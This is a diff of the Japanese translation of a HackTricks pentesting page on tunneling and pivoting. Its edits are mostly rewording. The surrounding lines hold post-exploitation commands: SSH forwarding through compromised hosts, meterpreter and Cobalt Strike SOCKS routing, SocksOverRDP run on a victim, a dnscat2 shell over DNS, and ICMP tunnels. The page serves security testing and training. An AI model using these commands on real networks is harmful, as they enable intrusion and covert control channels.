@@ -2,20 +2,20 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出して、あなたのハッキングトリックを共有してください。
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れます
+* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
 
 </details>
 
 ## Nmapのヒント
 
 {% hint style="warning" %}
-**ICMP**および**SYN**スキャンはソックスプロキシを介してトンネリングすることはできませんので、これを実現するには**ping discoveryを無効に** (`-Pn`) し、**TCPスキャン** (`-sT`) を指定する必要があります。
+**ICMP**および**SYN**スキャンはソックスプロキシを介してトンネリングすることはできませんので、これを機能させるために**ping discoveryを無効に**(`-Pn`)し、**TCPスキャン**(`-sT`)を指定する必要があります。
 {% endhint %}
 
 ## **Bash**
@@ -54,7 +54,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### ポートツーポート
 
-ローカルポート --> 侵害されたホスト（SSH） --> 第三のボックス：ポート
+ローカルポート --> 侵害されたホスト（SSH） --> サードボックス:ポート
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -79,7 +79,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPNトンネル
 
-両方のデバイスで**root権限**が必要です（新しいインターフェースを作成するため）。また、sshdの設定でrootログインを許可する必要があります:\
+両方のデバイスで**root権限**が必要です（新しいインターフェースを作成するため）そしてsshdの設定でrootログインを許可する必要があります:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -100,8 +100,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-**SSHUTTLE**を使用して、ホストを介してサブネットワークへのすべてのトラフィックを**ssh**経由で**トンネリング**できます。\
-たとえば、10.10.10.0/24に向かうすべてのトラフィックを転送する場合
+ホストを介してサブネットワークへのすべてのトラフィックをssh経由で**トンネリング**できます。\
+たとえば、10.10.10.0/24に向かうすべてのトラフィックを転送します。
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -122,7 +122,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKSは、ネットワーク内のトラフィックを転送するためのプロキシプロトコルです。通常、ファイアウォールをバイパスするために使用されます。SOCKSプロキシを使用すると、クライアントはリモートサーバーに直接接続する代わりに、プロキシサーバーを介して接続します。
+SOCKS（Socket Secure）は、ネットワークソケットを通じてトラフィックを転送するためのプロトコルです。通常、ファイアウォールをバイパスするために使用され、プライバシーと匿名性を提供します。
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -130,7 +130,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-もう一つの方法：
+別の方法：
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -147,7 +147,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-**ビーコンを介してトラフィックをルーティング**するために使用できるすべてのインターフェースでリッスンしているチームサーバーでポートを開きます。
+**ビーコンを介してトラフィックをルーティング**するために使用できるすべてのインターフェースでリッスンしているチームサーバーにポートを開きます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -158,7 +158,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-この場合、**ポートはビーコンホストで開かれ**、チームサーバーではなく、トラフィックがチームサーバーに送信され、そこから指定されたホスト:ポートに送信されます。
+この場合、**ポートはビーコンホストで開かれ**、チームサーバーではなく、そこから指定されたホスト:ポートにトラフィックが送信されます。
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -316,12 +316,12 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールはWindowsのRemote Desktop Service機能から`Dynamic Virtual Channels` (`DVC`)を使用します。 DVCは**RDP接続を介してパケットをトンネリング**する責任があります。
 2. [Proxifier ポータブルバイナリ](https://www.proxifier.com/download/#win-tab)
 
-クライアントコンピューターで**`SocksOverRDP-Plugin.dll`**をロードします。
+クライアントコンピューターで**`SocksOverRDP-Plugin.dll`**を次のようにロードします:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、`mstsc.exe`を使用して被害者にRDP経由で**接続**でき、**SocksOverRDPプラグインが有効**であるという**プロンプト**が表示され、**127.0.0.1:1080**で**リッスン**されるはずです。
+今、`mstsc.exe`を使用してRDP経由で被害者に**接続**でき、**SocksOverRDPプラグインが有効**であるという**プロンプト**が表示され、**127.0.0.1:1080**で**リッスン**されるはずです。
 
 **RDP**経由で**接続**し、被害者のマシンに`SocksOverRDP-Server.exe`バイナリをアップロードして実行します：
 ```
@@ -331,18 +331,18 @@ C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
 netstat -antb | findstr 1080
 ```
-今、そのポートを介してトラフィックをプロキシするために[**Proxifier**](https://www.proxifier.com/) **を使用できます。**
+Now you can use [**Proxifier**](https://www.proxifier.com/) **to proxy the traffic through that port.**
 
-## Windows GUIアプリをプロキシ化する
+## Proxify Windows GUI Apps
 
-Windows GUIアプリをプロキシを使用してナビゲートすることができます。[**Proxifier**](https://www.proxifier.com/)を使用します。\
-**Profile -> Proxy Servers** でSOCKSサーバーのIPとポートを追加します。\
-**Profile -> Proxification Rules** でプロキシを適用するプログラムの名前とプロキシを適用したいIPへの接続を追加します。
+You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
+In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
+In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.
 
-## NTLMプロキシバイパス
+## NTLM proxy bypass
 
-先に言及したツール: **Rpivot**\
-**OpenVPN** もこれをバイパスできます。構成ファイルで以下のオプションを設定します。
+The previously mentioned tool: **Rpivot**\
+**OpenVPN** can also bypass it, setting these options in the configuration file:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -350,7 +350,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-プロキシに対して認証し、指定した外部サービスに転送されるローカルポートをバインドします。その後、このポートを介して選択したツールを使用できます。\
+プロキシに対して認証を行い、指定した外部サービスに転送されるローカルポートをバインドします。その後、このポートを介して選択したツールを使用できます。\
 たとえば、ポート443を転送します。
 ```
 Username Alice
@@ -397,19 +397,19 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **PowerShell**
 
-PowerShellで[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます：
+[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用して、PowerShellでdnscat2クライアントを実行できます：
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **dnscatを使用したポートフォワーディング**
+#### **dnscatを使用したポート転送**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 #### プロキシチェーンのDNSの変更
 
-Proxychainsは`gethostbyname` libc呼び出しを傍受し、tcp DNSリクエストをソックスプロキシを介してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコードされています）。変更するには、ファイルを編集します：_/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**の場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libc呼び出しを傍受し、TCP DNSリクエストをソックスプロキシを介してトンネリングします。**デフォルト**では、proxychainsが使用するDNSサーバーは**4.2.2.2**（ハードコードされています）。変更するには、ファイルを編集します：_/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -422,7 +422,7 @@ Proxychainsは`gethostbyname` libc呼び出しを傍受し、tcp DNSリクエス
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-両方のシステムでルート権限が必要で、ICMPエコーリクエストを使用してトンアダプタを作成し、それら間でデータをトンネリングするために必要です。
+両方のシステムでルート権限が必要で、ICMPエコーリクエストを使用してトンアダプタを作成し、それらの間でデータをトンネリングするために必要です。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,8 +480,10 @@ chmod a+x ./ngrok
 ```
 #### HTTPコールのスニッフィング
 
-*XSS、SSRF、SSTIなどに便利...*
-標準出力から直接またはHTTPインターフェース[http://127.0.0.1:4040](http://127.0.0.1:4000)で。
+*XSS、SSRF、SSTIに便利...*
+標準出力から直接またはHTTPインターフェース[http://127.0.0.1:4040](http://127.0.0.1:4000)で。 
+
+#### 内部HTTPサービスのトンネリング
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -512,12 +514,12 @@ addr: file:///tmp/httpbin/
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセス**したいですか？または、HackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
+* **[💬](https://emojipedia.org/speech-balloon/) [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
